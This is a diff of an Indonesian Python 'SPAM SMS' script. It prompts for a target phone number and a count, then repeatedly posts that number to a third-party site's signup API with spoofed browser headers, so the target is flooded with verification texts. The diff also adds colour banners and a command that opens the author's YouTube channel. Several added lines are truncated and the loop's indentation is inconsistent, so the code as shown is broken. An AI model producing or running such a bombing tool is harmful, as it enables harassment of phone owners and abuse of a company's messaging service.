@@ -11,96 +11,115 @@ def mengetik(c):
           sys.stdout.flush()
           time.sleep(0.03)
 
+#warna liat
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+
 # program
 os.system( 'clear' )
+mengetik(f"{M}######################################>
+mengetik(f"{K}         •••••WELCOME TO MY SCRIPT••••>
+mengetik(f"{K}     •••••SUBCRIBE DULU CHANEL GUA BRO>
+mengetik("{M}######################################>
+time.sleep(3)
+os.system( 'clear' )
+os.system("xdg-open https://youtube.com/@riskimbmbg2>
 print("")
-mengetik("    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
-mengetik("    ∎                                    ∎")
-mengetik("    ∎         Author  : Rizqi Gans       ∎")
-mengetik("    ∎         YouTube : Riskimbmbg       ∎")
-mengetik("∎∎∎∎∎         Facebook: Riski mbmbg      ∎∎∎∎∎")
-mengetik("∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
-mengetik("∎   ∎                                    ∎   ∎")
-mengetik("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
+mengetik(f"{M}    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
+mengetik(f"{M}    ∎                                    ∎")
+mengetik(f"{M}    ∎         Author  : Rizqi Gans       ∎")
+mengetik(f"{M}    ∎         YouTube : Riskimbmbg       ∎")
+mengetik(f"{P}∎∎∎∎∎         Facebook: Riski mbmbg      ∎∎∎∎∎")
+mengetik(f"{P}∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
+mengetik(f"{P}∎   ∎                                    ∎   ∎")
+mengetik(f"{P}∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
 print("")
-print("Loading To Script..")
+print(f"{O}Loading To Script..")
 print("")
 print("")
 print("")
 time.sleep(1)
 
 # animasi loading
-mengetik("Loading [5%]")
-mengetik("Loading [25%]")
-mengetik("Loading [50%]")
-mengetik("Loading [75%]")
-mengetik("Loading [97%]")
-mengetik("Loading [99%]")
-mengetik("Loading [100%]")
+mengetik(f"{H}Loading [5%]")
+mengetik(f"{H}Loading [25%]")
+mengetik(f"{H}Loading [50%]")
+mengetik(f"{H}Loading [75%]")
+mengetik(f"{H}Loading [97%]")
+mengetik(f"{H}Loading [99%]")
+mengetik(f"{H}Loading [100%]")
 time.sleep(3)
-print("Login [✓]")
+print(f"{O}Login [✓]")
 
 import time, requests,json,os
 
 os.system("clear")
 
-print("    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
-print("    ∎                                    ∎")
-print("    ∎         Author  : Rizqi Gans       ∎")
-print("    ∎         YouTube : Riskimbmbg       ∎")
-print("∎∎∎∎∎         Facebook: Riski Mbmbg      ∎∎∎∎∎")
-print("∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
-print("∎   ∎                                    ∎   ∎")
-print("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
+print(f"{U}    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
+print(f"{U}    ∎                                    ∎")
+print(f"{U}    ∎         Author  : Rizqi Gans       ∎")
+print(f"{U}    ∎         YouTube : Riskimbmbg       ∎")
+print(f"{K}∎∎∎∎∎         Facebook: Riski Mbmbg      ∎∎∎∎∎")
+print(f"{K}∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
+print(f"{K}∎   ∎                                    ∎   ∎")
+print(f"{K}∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
 time.sleep(1.2)
-print("∎                                            ∎")
+print(f"{K}∎                                            ∎")
 time.sleep(1.2)
-print("∎                                            ∎")
+print(f"{K}∎                                            ∎")
 time.sleep(1.2)
-print("∎                                            ∎")
+print(f"{K}∎                                            ∎")
 time.sleep(1.2)
-print("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
+print(f"{H}∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
 time.sleep(1.2)
-print("∎   ∎ \                                / ∎   ∎")
+print(f"{H}∎   ∎ \                                / ∎   ∎")
 time.sleep(1.2)
-print("∎∎∎∎∎        Nomer Target 8xxxxxxx       ∎∎∎∎∎")
+print(f"{K}∎∎∎∎∎        Nomer Target 8xxxxxxx       ∎∎∎∎∎")
 time.sleep(1.2)
-print("    ∎        Usahakan Spam Mentok 5      ∎")
+print(f"{M}    ∎        Usahakan Spam Mentok 5      ∎")
 time.sleep(1.2)
-print("    ∎ /                                \ ∎")
+print(f"{H}    ∎ /                                \ ∎")
 time.sleep(1.2)
-print("∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
+print(f"{H}∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
 time.sleep(1.2)
-print("∎               ∎            ∎               ∎")
+print(f"{B}∎               ∎            ∎               ∎")
 time.sleep(1.2)
-print("∎               ∎∎∎∎∎∎∎∎∎∎∎∎∎∎               ∎")
+print(f"{B}∎               ∎∎∎∎∎∎∎∎∎∎∎∎∎∎               ∎")
 time.sleep(1.2)
-print("∎                                            ∎")
+print(f"{B}∎                                            ∎")
 time.sleep(1.2)
-print("∎                                            ∎")
+print(f"{B}∎                                            ∎")
 time.sleep(1.2)
-print("∎                                            ∎")
+print(f"{B}∎                                            ∎")
 time.sleep(1.2)
-print("∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
+print(f"{M}∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
 time.sleep(1.2)
-print("∎")
-nomer = input("∎∎∎ Nomer Target ∎∎∎ : ")
+print(f"{M}∎")
+k = 0
+nomer = input(f"{K}∎∎∎ Nomer Target ∎∎∎ : ")
 time.sleep(2)
-print("∎ Mendeteksi Nomer...")
+print(f"{O}∎ Mendeteksi Nomer...")
 time.sleep(3)
-print("∎ Nomer Aktif [✓]")
+print(f"{H}∎ Nomer Aktif [✓]")
 time.sleep(1.2)
-print("∎")
+print(f"{M}∎")
 time.sleep(1.2)
-print("∎")
+print(f"{M}∎")
 time.sleep(1.2)
-jumlah = int(input("∎∎∎ Jumlah Spam ∎∎∎ : "))
+k = 0
+jumlah = int(input(f"{K}∎∎∎ Jumlah Spam ∎∎∎ : "))
 time.sleep(3)
-print("∎")
+print(f"{H}∎")
 time.sleep(1.5)
-print("∎")
+print(f"{H}∎")
 time.sleep(1.5)
-print("∎")
+print(f"{H}∎")
 time.sleep(1.5)
 headers = {
 "Host" : "eci.id",
@@ -115,18 +134,19 @@ headers = {
 "Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
 data = json.dumps({"identity":"0"+nomer})
-for i in range(jumlah):
+for k in range(jumlah):
+        k += 1
 	pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
 
 if "success" in pos:
-    print("∎")
+    print(f"{H}∎")
     time.sleep(1.2)
-    print("∎∎∎ Cek Hp Target ∎∎∎ ",)
+    print(f"{K}∎∎∎ Cek Hp Target ∎∎∎ ",k)
 
 else:
-    print("∎")
+    print(f"{H}∎")
     time.sleep(1.2)
-    print("∎∎∎ Maaf Gagal ∎∎∎ ",)
+    print(f"{M}∎∎∎ Maaf Gagal ∎∎∎ ",k)
     time.sleep(1)
 os.system("clear")
 os.system("python KingSpam.py")
